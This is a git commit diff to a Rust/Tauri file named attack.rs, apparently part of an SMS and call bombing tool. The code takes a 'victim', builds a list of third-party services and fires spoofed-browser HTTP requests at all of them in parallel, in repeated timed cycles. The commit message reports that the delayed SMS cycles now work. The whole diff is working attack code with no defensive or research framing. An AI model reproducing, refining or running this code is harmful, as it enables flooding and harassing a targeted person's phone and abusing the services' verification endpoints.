8fa2949ae9972da0b552239b64d02796739145d3
Эдгар Томский <EdgarKozlov3229@gmail.com>
2024-12-13 17:23:31 +0300

    Пока, но рабочие циклы с задержкой на СМС.

--- src-tauri/src/attack.rs
+++ src-tauri/src/attack.rs
@@ -4,39 +4,47 @@ use crate::services::{
 use reqwest::{Client, Method};
 use std::time::Duration;
 
-const SERVICES_DELAY: u8 = 0;
-const CALL_DELAY: u8 = 60;
+const SERVICES_DELAY: u64 = 15;
+const CALL_DELAY: u64 = 15;
 
-pub async fn send(victim: Victim, cycles: u64) -> Result<(), Box<dyn std::error::Error>> {
-    let mut s = Vec::new();
+pub async fn send(victim: Victim, cycles: u64) {
+    // let services = construct_services_list(victim.clone()).await;
+    // for service in services {
+    //     let t = tokio::spawn(async move {
+    //         send_single(service).await.expect("");
+    //     });
+    //     s.push(t);
+    // }
 
-    let services = construct_services_list(victim.clone()).await;
-    for service in services {
-        let t = tokio::spawn(async move {
-            send_single(service).await.expect("");
-        });
-        s.push(t);
-    }
+    // let t = tokio::spawn(async move {
+    //     for _ in 0..cycles {
+    //         let services = construct_call_services_list(victim.clone()).await;
+    //         for service in services {
+    //             send_single(service).await.expect("");
+    //             tokio::time::sleep(Duration::from_secs(CALL_DELAY as u64)).await;
+    //         }
+    //     }
+    // });
+    // s.push(t);
 
-    let t = tokio::spawn(async move {
-        for _ in 0..cycles {
-            let services = construct_call_services_list(victim.clone()).await;
-            for service in services {
-                send_single(service).await.expect("");
-                tokio::time::sleep(Duration::from_secs(CALL_DELAY as u64)).await;
-            }
+    for i in 0..cycles {
+        let services = construct_services_list(victim.clone()).await;
+        let services_handles: Vec<_> = services
+            .into_iter()
+            .map(|item| tokio::spawn(send_single(item)))
+            .collect();
+
+        println!("Starting {} cycle", i + 1);
+        for services_handle in services_handles {
+            services_handle.await.unwrap();
         }
-    });
-    s.push(t);
-
-    for i in s {
-        i.await?;
+        if i < cycles - 1 {
+            tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
+        }
     }
-
-    Ok(())
 }
 
-async fn send_single(service: Service) -> Result<(), Box<dyn std::error::Error>> {
+async fn send_single(service: Service) {
     let client = Client::builder()
         .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0")
         .default_headers(service.headers)
@@ -54,8 +62,12 @@ async fn send_single(service: Service) -> Result<(), Box<dyn std::error::Error>>
         BodyType::Form => res = res.form(&service.body),
     }
 
-    let res = res.send().await?;
-    println!("{} {}\n{}\n", service.name, res.status(), res.text().await?);
-
-    Ok(())
+    println!("Starting {}", service.name);
+    let res = res.send().await.expect("");
+    println!(
+        "{} {}\n{}\n",
+        service.name,
+        res.status(),
+        res.text().await.unwrap()
+    );
 }
